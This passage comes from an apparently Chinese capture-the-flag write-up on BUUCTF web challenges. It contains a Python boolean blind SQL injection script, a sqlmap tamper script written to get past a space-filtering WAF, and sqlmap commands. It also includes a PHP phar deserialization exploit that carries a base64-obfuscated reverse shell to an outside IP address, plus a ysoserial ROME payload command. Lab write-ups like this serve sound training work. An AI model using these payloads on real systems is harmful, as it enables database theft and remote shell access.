fingerprint: MySQL 10.1.47</span><br><span class="line">               fork fingerprint: MariaDB</span><br><span class="line">banner: <span class="string">&#x27;10.1.47-MariaDB-0ubuntu0.18.04.1&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p><code>-f -b</code> 获取指纹信息与banner信息，<code>--answers</code> 自动回答带指定内容的询问，<code>--flush-session</code> 刷新会话（SQLmap会记录URL的注入内容，若之前成功过则直接读取，二次测试时需要刷新掉）。可以看到注入成功，成功获取指纹信息与banner。</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>本题中的name的值会被原样显示在响应页面里，但实际上他会做运算处理如 <code>1+1, 2^3</code> 等，这是引号被过滤的情况下仍然能联合注入的原因，也是下面另一种盲注思路的支撑。</p>
<p>来自另一篇WP的name盲注思路：</p>
<p>观察到 <code>name=1</code> 和 <code>name=0</code> 结果不同，且name实际上为数字型参数（<code>name=0+1</code> 与 <code>name=0+1-1</code> 结果也不同），这里就可以进行布尔盲注，利用 <code>0+(2&gt;1)</code> 或 <code>0^(2&gt;1)</code> 等句式实现布尔结果影响回显内容：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 获取数据库名称</span><br><span class="line"><span class="number">0</span><span class="operator">+</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span>); # <span class="literal">true</span></span><br><span class="line"><span class="number">0</span><span class="operator">+</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">96</span>); # <span class="literal">true</span>,说明数据库名第一个字母是小写字母</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span><span class="operator">+</span>(database()<span class="operator">=</span><span class="string">&#x27;wfy&#x27;</span>);	# <span class="literal">true</span>,得到数据库名称,后略</span><br></pre></td></tr></table></figure></div>

<p>放一个大佬WP中的盲注脚本：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">import requests, <span class="type">time</span></span><br><span class="line"># 爆破数据库名字</span><br><span class="line">def get_schema_name(url, schema_length):</span><br><span class="line">    # chars <span class="operator">=</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789!_,~&#x27;</span></span><br><span class="line">    flag <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, schema_length <span class="operator">+</span> <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">left</span> <span class="operator">=</span> <span class="number">32</span></span><br><span class="line">        <span class="keyword">right</span> <span class="operator">=</span> <span class="number">127</span></span><br><span class="line">        mid <span class="operator">=</span> (<span class="keyword">left</span> <span class="operator">+</span> <span class="keyword">right</span>) <span class="operator">/</span><span class="operator">/</span> <span class="number">2</span></span><br><span class="line">        while <span class="keyword">left</span> <span class="operator">&lt;</span> <span class="keyword">right</span>:</span><br><span class="line">            data <span class="operator">=</span> &#123;<span class="string">&#x27;name&#x27;</span>:f&quot;0^(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;&#125;</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="keyword">left</span> <span class="operator">=</span> mid <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">right</span> <span class="operator">=</span> mid</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            mid <span class="operator">=</span> (<span class="keyword">left</span> <span class="operator">+</span> <span class="keyword">right</span>) <span class="operator">/</span><span class="operator">/</span> <span class="number">2</span></span><br><span class="line">        if mid <span class="operator">=</span><span class="operator">=</span> <span class="number">32</span> <span class="keyword">or</span> mid <span class="operator">=</span><span class="operator">=</span> <span class="number">126</span>:</span><br><span class="line">            pass</span><br><span class="line">        flag <span class="operator">+</span><span class="operator">=</span> chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"># 爆破所有表</span><br><span class="line">def get_tables(url, schema_name):</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">sql</span> <span class="operator">=</span> f&quot;select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;&#123;schema_name&#125;&#x27;)&quot;</span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            data<span class="operator">=</span>&#123;&quot;name&quot;:f&quot;0^(ascii(substr((&#123;sql&#125;),&#123;count&#125;,1))=&#123;num&#125;)&quot;&#125;</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text <span class="keyword">or</span> chr(num) <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(num)</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        if <span class="keyword">result</span>[<span class="number">-1</span>] <span class="operator">=</span><span class="operator">=</span> &quot;~&quot;:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"># 爆破关键表的列</span><br><span class="line">def get_column_by_table(url, <span class="keyword">table</span>):</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">sql</span> <span class="operator">=</span> f&quot;select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;&#123;table&#125;&#x27;)&quot;</span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            data <span class="operator">=</span> &#123;&quot;name&quot;:f&quot;0^(ascii(substr((&#123;sql&#125;),&#123;count&#125;,1))=&#123;num&#125;)&quot;&#125;</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text <span class="keyword">or</span> num <span class="operator">=</span><span class="operator">=</span> <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(num)</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        if <span class="keyword">result</span>[<span class="number">-1</span>] <span class="operator">=</span><span class="operator">=</span> &quot;~&quot;:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"># 爆破关键的具体字符 username password</span><br><span class="line">def get_value(url, <span class="keyword">table</span>, <span class="operator">*</span>columns):</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    c <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">column</span> <span class="keyword">in</span> columns:</span><br><span class="line">        c <span class="operator">+</span><span class="operator">=</span> <span class="keyword">column</span> <span class="operator">+</span> &quot;,&#x27;-&#x27;,&quot;</span><br><span class="line">    print(c[:<span class="number">-5</span>])</span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            # 根据提示应该是id<span class="operator">=</span><span class="number">100</span>有flag</span><br><span class="line">            <span class="keyword">sql</span> <span class="operator">=</span> f&quot;select(group_concat(&#123;c[:-5]&#125;))from(&#123;table&#125;)where(id=100)&quot;</span><br><span class="line">            data <span class="operator">=</span> &#123;&quot;name&quot;:f&quot;0^(ascii(substr((&#123;sql&#125;),&#123;count&#125;,1))=&#123;num&#125;)&quot;&#125;</span><br><span class="line">            print(data)</span><br><span class="line">            resp <span class="operator">=</span> session.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data)</span><br><span class="line">            if success <span class="keyword">in</span> resp.text <span class="keyword">or</span> num <span class="operator">=</span><span class="operator">=</span> <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">result</span> <span class="operator">+</span><span class="operator">=</span> chr(num)</span><br><span class="line">                print(<span class="keyword">result</span>)</span><br><span class="line">                break</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">        if <span class="keyword">result</span>[<span class="number">-1</span>] <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    # 布尔盲注</span><br><span class="line">    session <span class="operator">=</span> requests.session()</span><br><span class="line">    # 成功的标识</span><br><span class="line">    success <span class="operator">=</span> <span class="string">&#x27;好耶！&#x27;</span></span><br><span class="line">    url <span class="operator">=</span> &quot;http://234d565f-bb2c-4daf-b44c-f8a6c546a4ec.node4.buuoj.cn:81/comments.php&quot;</span><br><span class="line">    # 数据库名字 wfy</span><br><span class="line">    # get_schema_name(url<span class="operator">=</span>url,schema_length<span class="operator">=</span><span class="number">3</span>)</span><br><span class="line">    # 获取表 wfy_admin,wfy_comments,wfy_information</span><br><span class="line">    # get_tables(url<span class="operator">=</span>url, schema_name<span class="operator">=</span><span class="string">&#x27;wfy&#x27;</span>)</span><br><span class="line">    # 获得列名</span><br><span class="line">    # wfy_information:title,header</span><br><span class="line">    # wfy_comments:id,text,<span class="keyword">user</span>,name,display</span><br><span class="line">    # wfy_admin:Id,username,password,cookie</span><br><span class="line">    # get_column_by_table(url<span class="operator">=</span>url,<span class="keyword">table</span><span class="operator">=</span><span class="string">&#x27;wfy_admin&#x27;</span>)</span><br><span class="line">    # 具体字段 <span class="number">100</span><span class="operator">-</span>f1ag_is_here<span class="operator">-</span>You have <span class="keyword">no</span> way <span class="keyword">to</span> <span class="keyword">get</span> my F1AG<span class="operator">-</span>flag&#123;We_0nly_have_2wo_choices&#125;</span><br><span class="line">    # get_value(url,<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<hr>
<p>​		像这种布尔盲注用SQLmap并不能直接解决，设置布尔盲注后直接运行似乎也没能跑通，主要问题在于过滤了空格，且可替换的选项很少，<code>%0A,%09,/**/,#</code> 等全被过滤，sqlmap提供的脚本tamper中只有随机替换空格的脚本，没法稳定解决这个WAF，看了一下脚本都是python编写，尝试自己编写一个：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># space2special.py</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    blanks = (<span class="string">&quot;%0B&quot;</span>, <span class="string">&quot;%0B&quot;</span>, <span class="string">&quot;%0B&quot;</span>, <span class="string">&quot;%0B&quot;</span>)	<span class="comment"># 只改了这里，元组长度必须要对上，就偷懒了一下没深究细节</span></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27; &#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += random.choice(blanks)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>写好的脚本需要放置在sqlmap默认脚本库中 <code>/usr/share/sqlmap/tamper/</code> 下，sqlmap能自动识别其中的脚本，同时脚本的启动需要该库中的 <code>__init__.py</code> 文件，因此不推荐使用绝对路径在别处运行脚本。</p>
<p>​		另一方面布尔盲注需要对比成功与失败，一方面要设置 <code>--string</code> 参数作为”查询成功”标记，同时还需要让原始请求能够到成功的请求，原始请求包：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/comments.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>2cdb0d1d-7e28-46e6-a461-b3af440e1a3c.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://2cdb0d1d-7e28-46e6-a461-b3af440e1a3c.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://2cdb0d1d-7e28-46e6-a461-b3af440e1a3c.node4.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span><span class="number">1</span></span></span><br></pre></td></tr></table></figure></div>

<p><code>name=1</code> 是能够查询出结果的，查询成功的标志是字符串”好耶”。</p>
<p>随后使用上述脚本运行sqlmap，最低Level即可：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -r /mnt/c/Users/Forestsetyou/Desktop/package.txt --technique B -p <span class="string">&quot;name&quot;</span> --string=<span class="string">&#x27;好耶&#x27;</span> --delay=0.1 --tamper=space2special.py -D wfy -T wfy_comments -C text --dump --<span class="built_in">where</span> <span class="string">&quot;id=100&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>成功获得flag！</p>
<hr>
<p>补一个不从文件生成HTTP请求的用于Sqlmap的payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://51dfbe4c-9dca-4359-8e23-01b1dd2a2b45.node4.buuoj.cn:81/comments.php --method=POST --data=<span class="string">&quot;name=1&quot;</span> --delay=0.1 --tamper=space2special.py --technique B -v 3 --string=<span class="string">&quot;好耶&quot;</span> --user-agent=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span> --flush-session</span><br></pre></td></tr></table></figure></div>

<p>要点在于给请求加上UA，若不加UA注不出结果。</p>
<h3 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h3><p>参考：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/127307656" >WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/&gt;|&lt;|\?|php|&quot;.urldecode(&quot;%0a&quot;).&quot;/i&quot;</span><br></pre></td></tr></table></figure></div>

<p><code>%0a</code> 表示回车</p>
<p>主要利用<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/16786627.html" >phar反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，上传一个压缩包保存为： <code>upload/0412c29576c708cf0155e8de242169b1.jpg</code> ，如下访问进行反序列化</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class.php?file=phar://upload/0412c29576c708cf0155e8de242169b1.jpg/test.php</span><br></pre></td></tr></table></figure></div>

<p>弹shell的EXP：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;\rsystem(&#x27;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC84MS42OS4yMjcuMjA0LzIzMzM0IDA+JjEnCg== | base64 -d | bash&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></div>

<p>这里采用base64绕过的方式进行反弹shell，实际执行的语句为：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/81.69.227.204/23334 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p><code>%0a == \n</code> 换行符被过滤了，为了绕过前置注释符还可使用回车 <code>\r</code> </p>
<p>生成phar文件后改后缀为gif上传”test.gif”，保存为 <code>tmp/6ab7f8f0de1325b480be3294591342b5.gif</code> ，访问：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.php?file=phar:<span class="comment">//upload/0412c29576c708cf0155e8de242169b1.jpg/test.php</span></span><br></pre></td></tr></table></figure></div>

<p>在本地访问时需要改为：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.php?file=phar:<span class="comment">//upload/0412c29576c708cf0155e8de242169b1.jpg/test.php/test.txt</span></span><br></pre></td></tr></table></figure></div>

<p>猜测与PHP设置或版本有关系，本地测试时必须指明压缩包内的具体文件名。经反弹shell发现题目中的php版本为7.3.15。</p>
<p>更新：本地访问时和测试环境一样， 不需要额外加内容。得出两者不同的原因是之前本地测试时多加了一行 <code>$s=file_get_conotents($_get[&#39;file&#39;])</code> 导致出现了额外的报错，以及本地环境是Windows，部分测试命令无法运行导致网页无反应。</p>
<hr>
<p>解题步骤：用EXP打包phar攻击文件，更改后缀为图片格式后缀绕过上传过滤，上传文件后记录保存位置，访问 <code>class.php</code> 利用file参数调用到 <code>file_exists()</code> 函数，传入phar流并实现反序列化攻击：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:83/class.php?file=phar://tmp/daf280af792fd5b906511363ae2bc39d.gif</span><br></pre></td></tr></table></figure></div>

<p>即可成功调用phar内的攻击命令。</p>
<p>flag在 <code>/flag</code> 中，获取flag：<code>flag&#123;1c17302d-b3ae-435a-9650-005cd71630e8&#125;</code></p>
<h3 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h3><p><em>传说中的 JAVA 反序列化</em></p>
<p>JAVA 反序列化属实有点抽象了，但 BUU 本题的靶场好像炸了，之后再来做吧。</p>
<p>总之先让我研究一下 Idea 怎么导入和引用 jar 包，springboot 框架的特性与架构，ysoserial 工具的使用、JAVA-Rome 反序列化链条的分析与利用….再来做！</p>
<hr>
<h4 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h4><p>使用 ysoserial 解题，payload：<code>java -jar ./ysoserial-all.jar ROME &#39;calc.exe&#39;</code></p>
<p>生成的 payload 经过 base64+URL 编码后传入即可：</p>
